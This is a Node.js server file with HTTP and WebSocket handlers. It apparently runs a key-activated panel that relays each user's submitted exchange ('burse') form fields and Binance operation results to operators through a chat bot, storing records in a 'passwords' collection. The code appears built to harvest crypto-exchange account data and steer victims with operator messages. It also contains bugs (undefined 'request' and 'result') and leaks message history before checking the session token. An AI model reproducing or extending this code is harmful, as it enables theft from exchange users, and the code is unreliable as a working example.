const WebSocket = require('ws');
const {EventEmitter} = require('events');
const dbWorker = require('./db_worker.js');
const http = require('http');
const sessionIdGenerator = new (require('uuid-token-generator'))();
const Error = function({text, code}) {
    this.text = text;
    this.code = code;
    this.endRes = function(res) {
        res.statusCode = 400;
        res.end(JSON.stringify({type: 'error', text, code}));
    }
}
const Rejection = function({text, code}) {
    this.text = text;
    this.code = code;
    this.endRes = function(res) {
        res.statusCode = 403;
        res.end(JSON.stringify({type: 'reject', text, code}));
    }
}
const tokens = new Array();
const server = http.createServer( async (req, res) => {
    // console.log(req.url);
    res.setHeader("Access-Control-Allow-Origin", "*");
    if (req.url === '/reg' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk;
            if (body.length > 1e6) request.connection.destroy();
        });
        req.on('end', async () => {
            let data;
            try {
                data = JSON.parse(body);
            }
            catch (e) {
                console.error(e);
                res.statusCode = 400;
                res.end('bad request');
            }
            console.log(data);


            
            const key = data.key;
            if (!key) {
                res.statusCode = 400;
                res.end('bad request');
                return;
            }
            const keyData = await dbWorker.checkKey(key).catch(console.error);
            console.log(keyData);
            const isExist = !!keyData.key;
            const {isUsed} = keyData;
            const id = Math.floor(Math.random()*2000000077);
            if (isExist && !isUsed) {
                dbWorker.setUsed(key, id).then(() => {
                    const token = sessionIdGenerator.generate();
                    tokens.push(token);
                    const dataToUser = JSON.stringify({key, userId: id, sessionToken: token});
                    res.end(dataToUser);
                    botWorker.replyToAll(`Только что активировали ключ\nKey: |||${key}|||`);
                }).catch(e => {
                    console.error(e);
                    const error = new Error({code: 'reg_err_sU', text: 'Registration error when writing to database'});
                    error.endRes(res);
                });
            }
            else {
                const rejection = new Rejection({code: 'key_used', text: 'The key you want to use is not exists or already used'});
                rejection.endRes(res);
            }
        });
        return;
    }
    else if (req.url === '/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk;
            if (body.length > 1e6) request.connection.destroy();
        });
        req.on('end', () => {
            let data;
            try {
                data = JSON.parse(body);
            }
            catch (e) {
                console.error(e);
                res.statusCode = 400;
                res.end('bad request');
            }
            console.log(data);
            const key = data.key;
            const id = data.userId;
            if (!key || !id) {
                const rejection = new Rejection({code:'login_dt_inv', text: 'Uncorrect data'});
                rejection.endRes(res);
                return;
            }
            dbWorker.loginById(key, id).then(isSuccess => {
                console.log(key, id, isSuccess);
                if (isSuccess) {
                    const token = sessionIdGenerator.generate();
                    tokens.push(token);
                    res.end(JSON.stringify({sessionToken: token}))
                }
                else {
                    const rejection = new Rejection({code:'login_dt_inv', text: 'Uncorrect data'});
                    rejection.endRes(res);
                }
            }).catch(e => {
                const error = new Error({code: 'dt_n_fnd', text: 'Uncorrect key or server error'})
                error.endRes(res);
            });
        });
    }
    else res.end('end');
});
server.listen(80);
const websocketServer = new WebSocket.Server({server});
const message_emitter = new EventEmitter();

websocketServer.on('connection', (client) => {
    client.on('message', data => {

    let parsed_data;
    try {
        parsed_data = JSON.parse(data);
        const eventName = parsed_data.event;
        parsed_data.body.client = client;
        if (typeof(eventName)!=='string') return;
        console.log(eventName);
        message_emitter.emit(eventName, parsed_data.body);
    }
    catch (e) {
        console.error(e);
    }

        
    });
});


message_emitter.on('init', async (data) => {
    const token = data.sessionToken;
    const userId = data.userId;
    const client = data.client;
    client.userId = userId;
    sendMessagesHistory(client.userId);
    if (tokens.indexOf(token) !== -1) {
        client.sessionToken = token;
        // tokens.splice(tokens.indexOf(token), 1);
    }
    else {
        console.log('close');
        client.close();
    }
});
message_emitter.on('send-form', (data) => {
    const burseData = data.burseData;
    const isAutoreplyOn = botWorker.isAutoreplyOn();
    let message = `Пользователь с ключом |||${data.key}||| отправил свои данные\nАвтоответ: ${isAutoreplyOn ? 'Да' : 'Нет'}\n`;
    for (const fieldName in burseData) {
        const object = burseData;
        if (Object.hasOwnProperty.call(object, fieldName)) {
            const value = object[fieldName];
            message+= fieldName + ': ' + (value || 'не введено') + '\n'; 
        }
    }
    if (isAutoreplyOn) {
        const text = botWorker.getAutoreplyText();
        if (text && text.length !== 0) {
            sendMessage(data.key, text, isSuccess => console.log(isSuccess));
        }
    }
    botWorker.replyToAll(message);
});
message_emitter.on('read-message', (data) => {
    let message = `Пользователь с ключом |||${data.key}||| прочитал сообщения`;
    botWorker.replyToAll(message);
});
message_emitter.on('binance-result', data => {
    const msg = data.data.msg;
    botWorker.replyToAll(`Пользователь с ключом |||${data.key}||| обработал оперцию на Binance\nОтвет API: ${result ? 'success' : 'failed'}\n${msg ? msg : ''}`);
});


const Message = function (text) {
    this.text = text;
    this.date = (new Date()).getTime();
}

const sendMessage = function (userId, message, callback) {
    console.log(userId);
    let sent = false;
    const messageInstance = new Message(message);
    dbWorker.getDb().collection('passwords').findOne({key: userId}, (err, data) => {
        console.log(userId);
        if (data && data.messages) {
            const messages = data.messages;
            messages.push(messageInstance);
            dbWorker.getDb().collection('passwords').update({key: userId}, {$set: {messages: messages}});
        } 
    });
    websocketServer.clients.forEach(client => {
        console.log(userId, client.userId);
        if (client.userId === userId) {
            client.send(JSON.stringify({event: 'new-message', body: {message: messageInstance}}));
            sent = true;
            return callback(true);
        }
    });
    if (!sent) {
        return callback(false);
    }
}
const sendToClient = function (userId, message, callback) {
    console.log(userId);
    let sent = false;
    websocketServer.clients.forEach(client => {
        console.log(userId, client.userId);
        if (client.userId === userId) {
            client.send(JSON.stringify(message));
            sent = true;
            return callback(true);
        }
    });
    if (!sent) {
        return callback(false);
    }
}
const sendMessagesHistory = function(key) {
    dbWorker.findInDb('passwords', {key}, (err, data) => {
        if (data) {
            const messages = data.messages;
            console.log(messages);
            const key = data.key;
            websocketServer.clients.forEach(client => {
                if (client.userId === key) {
                    client.send(JSON.stringify({event: 'messages-history', body: {messages: messages}}));
                }
            });
        }
    });
}


module.exports = {
    sendMessage,
    sendToClient
}

const botWorker = require('./bot');
